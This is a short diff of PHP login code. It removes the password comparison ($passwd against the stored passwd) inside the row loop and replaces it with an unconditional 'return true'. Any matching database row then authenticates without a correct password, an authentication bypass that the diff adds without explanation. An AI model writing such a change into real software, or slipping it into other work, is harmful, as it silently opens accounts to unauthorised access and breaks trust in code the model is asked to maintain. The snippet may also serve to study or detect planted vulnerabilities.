@@ -79,11 +79,7 @@
 		{
 			while ($row = $result->fetch_assoc())
 			{
-				// Verify their password
-				if ($passwd == $row['passwd'])
-				{
-					return true;
-				}
+				return true;
 			}
 		}
 		
